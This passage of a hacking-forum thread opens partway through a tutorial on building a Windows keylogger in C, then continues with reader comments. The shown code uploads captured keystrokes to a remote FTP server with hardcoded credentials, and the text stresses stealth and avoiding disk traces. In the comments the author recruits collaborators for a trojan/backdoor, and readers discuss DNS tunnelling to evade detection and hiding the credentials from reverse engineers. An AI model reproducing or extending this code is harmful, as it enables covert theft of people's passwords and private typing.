    return CallNextHookEx(0, nCode, wParam, lParam);
}
</code></pre>
<p>This function is quite lengthy, purely because of the need to properly parse and format the recorded keystroke. There is a lot of hard coding involved to check the given virtual key code provided by the <code>lParam</code> parameter. In summary, switch cases are used to provide the corresponding character with a virtual key code which must be checked against the <code>SHIFT</code> key to see if any alternate keystrokes were used. For special keys such as <code>Enter</code> and <code>Caps Lock</code>, formatting is needed so that a label is recorded in place of the actual character. Of course, this is just my implementation of the formatting and by all means, it is entirely possible to have the raw character instead of a representative label.</p>
<p>After all of that has been processed, the keystrokes in the keystroke buffer must be moved into the temporary buffer for uploading. The keystroke buffer needs to be checked first before it can move on to new keystroke input. To make sure that it is always available, an infinite wait state is entered until the temporary buffer is available. When the wait state is unlocked, it will move the data in the keystroke buffer to the temporary buffer and signal for uploading, then zero out the memory for space for new keystrokes. Otherwise, it will enter a wait state which will immediately time out if the temporary buffer is not yet available and continue on.</p>
<hr>
<h2><code>FTPSend</code></h2>
<p>The following is the pseudocode for the <code>FTPSend</code> function.</p>
<pre><code class="lang-makefile">FTPSend
1. Sleep for a specified timeout period
2. Signal that the upload buffer has no data to upload
3. Wait until data has been placed into the upload buffer and is signaled
4. Initialize an FTP internet connection
5. Send an FTP append command to append the data in the upload buffer
6. Write the data to the remote file
7. Close connection and repeat indefinitely
</code></pre>
<p>A method to prevent disk activity on the target machine is to directly transfer the data over the web. The following code snippet shows how this can be done.</p>
<pre><code class="lang-auto">VOID FTPSend(VOID) {
    while (TRUE) {
        // wait until upload buffer has new data
        Sleep(TIMEOUT);
        SetEvent(hTempBufNoData);
        WaitForSingleObject(hTempBufHasData, INFINITE);

        HINTERNET hINet = InternetOpen(NAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_PASSIVE);
        if (hINet == NULL)
            continue;

        HINTERNET hFTP = InternetConnect(hINet, FTP_SERVER, INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME, FTP_PASSWORD, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, NULL);
        if (hFTP == NULL) {
            InternetCloseHandle(hINet);
            continue;
        }

        HINTERNET hFTPFile;
        CHAR szTemp[256];
        // FTP append command
        sprintf(szTemp, "APPE %s", FTP_LOG_PATH);
        BOOL bSuccess = FtpCommand(hFTP, TRUE, FTP_TRANSFER_TYPE_ASCII, szTemp, 0, &amp;hFTPFile);
        if (bSuccess == FALSE) {
            InternetCloseHandle(hFTP);
            InternetCloseHandle(hINet);
            continue;
        }

        DWORD dwWritten = 0;
        bSuccess = InternetWriteFile(hFTPFile, lpTempBuf, strlen(lpTempBuf), &amp;dwWritten);
        if (bSuccess == FALSE) {
            InternetCloseHandle(hFTP);
            InternetCloseHandle(hINet);
            continue;
        }

        InternetCloseHandle(hFTPFile);
        InternetCloseHandle(hFTP);
        InternetCloseHandle(hINet);
        ResetEvent(hTempBufHasData);
        //SetEvent(hTempBufNoData);
    }

    ExitThread(0);
}
</code></pre>
<p>Thereâ€™s probably a more efficient way to do this but this is how I did it. I didnâ€™t want to keep the handle to the FTP server because that would probably mean that the process would maintain an connection with the remote server which is not as stealthy. Inside this infinite loop, it <code>Sleep</code>s a specified timeout value <code>TIMEOUT</code> before doing anything else to try to limit the rate of connections. It will then signal that its temporary buffer has no data to upload and then enter an infinite wait state until the data in the keystroke buffer has transferred its content over. After this has been achieved, it will open an FTP internet connection and then authenticate with the server using the defined credentials. To write the keystrokes to the server, it will issue an <code>APPE</code> (append) command to the specified file location and begin writing. Once this is done, it will proceed to close the connection and repeat.</p>
<p>While writing this, Iâ€™ve realized that I should probably signal the no data object first before <code>Sleep</code>ing. Iâ€™ll keep it like so for now since I donâ€™t want to accidentally break the code.</p>
<h2>Conclusion</h2>
<p>Thatâ€™s pretty much it for the showcasing of my code. If there are any errors or concerns, please donâ€™t hesitate to contact me and I will try to handle it ASAP. Thanks for reading and hope youâ€™ve learned something from this.</p>
<h2>Appendix</h2>
<p>Other functions not mentioned:</p>
<pre><code class="lang-auto">// error message handler function
VOID Fatal(LPCSTR s) {
#ifdef DEBUG
    CHAR err_buf[BUF_SIZ];

    sprintf(err_buf, "%s failed: %lu", s, GetLastError());
    MessageBox(NULL, err_buf, NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif

    ExitProcess(1);
}

// clean up function on exit
VOID CleanUp(VOID) {
    if (lpLogBuf &amp;&amp; ghLogHeap) {
        HeapFree(ghLogHeap, 0, lpLogBuf);
        HeapDestroy(ghLogHeap);
    }
    if (ghHook) UnhookWindowsHookEx(ghHook);
    if (ghMutex) CloseHandle(ghMutex);
    if (lpTempBuf &amp;&amp; ghTempHeap) {
        HeapFree(ghTempHeap, 0, lpTempBuf);
        HeapDestroy(ghTempHeap);
    }
}
</code></pre>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="11" />
              <span class='post-likes'>11 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/IoTh1nkN0t.html'><span itemprop='name'>IoTh1nkN0t</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-11T16:34:48Z' class='post-time'>
                    September 11, 2016,  4:34pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-11T16:34:48Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Awesome tutorial man, like always well written.<br>
Iâ€™m thinking of diving in the WinAPI once again.<br>
<img src="../../../0x00sec.org/images/emoji/twitter/%2b1c164.html?v=9" title=":+1:" class="emoji only-emoji" alt=":+1:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-11T16:37:09Z' class='post-time'>
                    September 11, 2016,  4:37pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-11T16:37:09Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>To be honest, thereâ€™s probably a thousand bugs with the multithreading, but Iâ€™m not too motivated to fix this. Iâ€™m also keen for anyone interested in helping me develop a Win32 trojan/backdoor so if youâ€™re interested, hit me up.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/IoTh1nkN0t.html'><span itemprop='name'>IoTh1nkN0t</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-11T16:39:21Z' class='post-time'>
                    September 11, 2016,  4:39pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-11T16:39:21Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Yes Iâ€™m interested, Iâ€™ll have to finish this homework and then Iâ€™ll have time later today.<br>
Will you be online in a few hours?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-11T16:47:09Z' class='post-time'>
                    September 11, 2016,  4:47pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-11T16:47:09Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>How long is a few hours? Also, Iâ€™m not planning to start the project so soon. Will probably need more people on this.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/IoTh1nkN0t.html'><span itemprop='name'>IoTh1nkN0t</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-11T16:51:23Z' class='post-time'>
                    September 11, 2016,  4:51pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-11T16:51:23Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Alright, letâ€™s try to find some people interested. In the mean time Iâ€™ll try to get to know the WinAPI better.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Valentine.html'><span itemprop='name'>Valentine</span></a>
                (Valentine)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-13T11:34:18Z' class='post-time'>
                    September 13, 2016, 11:34am
                  </time>
                  <meta itemprop='dateModified' content='2016-09-13T11:34:18Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Iâ€™ve been messing around with keyloggers lately. Great tutorial but I admit this isnâ€™t exactly my style of a keylogger. Iâ€™ve found a keylogger code that utilizes a batch script and C code, but to hide the batch window the creator utilizes a vbs script. Pretty much the batch script uploads the keystroke that are saved to a file. I find this method much more easier and it is interesting. Iâ€™ve just started messing around with winAPI. My question is, if I wanted to improve the code how would I go about it?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-13T13:43:02Z' class='post-time'>
                    September 13, 2016,  1:43pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-13T13:43:02Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Yes, there are many different ways of creating keyloggers however, some methods are better than others in certain aspects. For example, it is much easier using your method but it involves a lot of dependency with other files and because of this, it <em>might</em> cause some issues if you end up failing to access certain files or if some of the files fail to work unexpectedly and itâ€™s much more of a hassle to deal with multiple files rather than one. Also, having or creating many files (especially your file containing the keystrokes) tend to leave lot of forensic evidence and footprints.</p>
<p>With regards to your question, which code are you wanting to improve? Mine or yours?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_9' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Fust3rCluck.html'><span itemprop='name'>Fust3rCluck</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-13T19:39:42Z' class='post-time'>
                    September 13, 2016,  7:39pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-13T21:10:50Z'>
              <span itemprop='position'>9</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Awesome, as someone who is learning C/C++ I can say Iâ€™m happy that i understand at least a little bit of that code. <img src="../../../0x00sec.org/images/emoji/twitter/stuck_out_tonguec164.html?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"> I could use nullptr instead of NULL correct?</p>
<p>EDIT: I got NULL and nullptr mixed up lol.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_10' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/oaktree.html'><span itemprop='name'>oaktree</span></a>
                (oaktree)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-13T20:39:18Z' class='post-time'>
                    September 13, 2016,  8:39pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-13T20:39:18Z'>
              <span itemprop='position'>10</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p><a class="mention" href="../../u/fust3rcluck-2.html">@Fust3rCluck</a>: <code>nullptr</code> is a C++ thing. I believe that <a class="mention" href="../../u/dtm.html">@dtm</a> is using C.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_11' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Fust3rCluck.html'><span itemprop='name'>Fust3rCluck</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-13T21:10:23Z' class='post-time'>
                    September 13, 2016,  9:10pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-13T21:10:23Z'>
              <span itemprop='position'>11</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thanks and I got nullptr and NULL mixed up actually.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_12' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/oaktree.html'><span itemprop='name'>oaktree</span></a>
                (oaktree)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-13T21:46:48Z' class='post-time'>
                    September 13, 2016,  9:46pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-13T21:46:48Z'>
              <span itemprop='position'>12</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p><code>nullptr</code> is more or less just a <code>typedef</code>. You could use <code>NULL</code> every single time in C++, if you wanted to do so. <code>nullptr</code> was introduced simply to make intentions appear more clear.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_13' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Valentine.html'><span itemprop='name'>Valentine</span></a>
                (Valentine)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-14T11:23:32Z' class='post-time'>
                    September 14, 2016, 11:23am
                  </time>
                  <meta itemprop='dateModified' content='2016-09-14T11:23:32Z'>
              <span itemprop='position'>13</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I guess mine that I want to improve.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_14' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-15T01:26:55Z' class='post-time'>
                    September 15, 2016,  1:26am
                  </time>
                  <meta itemprop='dateModified' content='2016-09-15T01:26:55Z'>
              <span itemprop='position'>14</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Well I donâ€™t know the specifics of the procedures but you can start by doing something about some of the issues Iâ€™ve mentioned above.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_15' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Valentine.html'><span itemprop='name'>Valentine</span></a>
                (Valentine)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-15T11:36:35Z' class='post-time'>
                    September 15, 2016, 11:36am
                  </time>
                  <meta itemprop='dateModified' content='2016-09-15T11:36:35Z'>
              <span itemprop='position'>15</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thank you very much for the help.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_16' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/123loaded.html'><span itemprop='name'>123loaded</span></a>
                (123loaded)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-16T10:57:07Z' class='post-time'>
                    September 16, 2016, 10:57am
                  </time>
                  <meta itemprop='dateModified' content='2016-09-16T10:57:07Z'>
              <span itemprop='position'>16</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Awesome Awesome Awesome tutorial man. Your first keylogging tutorial gave anybody looking All the means they needed to get the job done and was very well informed as well. You could have just written this and held onto it but instead decided to share it and explain it, though the code is pretty self explanatory imhoâ€¦ but good code should be haha.</p>
<p>If you donâ€™t mind my asking, how much of this did you actually write on your own? Nearly Zero % is a fine answer here, since from the tutorial and your explanation itâ€™s obvious you understand it, and thatâ€™s all that really matters when coding really. As Eric Raymond said in the popular computer science book <em>The Cathedral and the Bazaar</em>, â€œGood programmers know what to write. <strong>Great</strong> ones know what to <strong>rewrite &amp; reuse</strong>â€â€¦ sometimes also said â€œgood programmers write good code; great programmers steal great codeâ€ hahaha.</p>
<p>Anyways, Iâ€™m loving these tutorials. Keep em coming. And I wouldnâ€™t mind getting in touch with you and developing some fun projects. I think this (or any virus/exfiltration over the wire really) would be really fun/interesting to try to tunnel the data out via DNS, as DNS is <strong>never</strong> blocked by IPS/IDS and is hardly ever scrutinized/monitored either. I may look into doing that using this code and extend this series hahaâ€¦ Though obviously this could be extended to all Sorts of ideas, but in general my first thought was to do whateverâ€™s necessary to remove the FTP credentials from the binary itself, as to not be reversed by someone at a later date. Keep 'em comin man! Thx!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_17' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-16T12:32:24Z' class='post-time'>
                    September 16, 2016, 12:32pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-16T12:32:24Z'>
              <span itemprop='position'>17</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Actually, most of this code was developed by me. I did however, reference some of the virtual key code mappings and concatenation from <a href="../../../external.html?link=http://codereview.stackexchange.com/questions/46980/windows-keylogger-in-c">Code Review on Stack Exchange</a>.</p>
<p>As for the credentials, yes it is a problem. One way to â€œsolveâ€ this issue is by encrypting the strings so that it makes it harder for the reverse engineering to find them but letâ€™s face it, itâ€™s not that hard to break just before the FTP write function call and then pulling the decrypted data off the stack. The emailing method is a possible solution as well but I wasnâ€™t bothered coding that in C.</p>
<p>Iâ€™m actually doing a collaborated project right now (if you didnâ€™t see from above comments). I will private message you and the others about the details.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_18' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-01-21T00:42:21Z' class='post-time'>
                    January 21, 2018, 12:42am
                  </time>
                  <meta itemprop='dateModified' content='2018-01-21T00:42:21Z'>
              <span itemprop='position'>18</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="bkTQZWopyvXT1KkNFItWMKnpe"></script>
  </body>
  
</html>
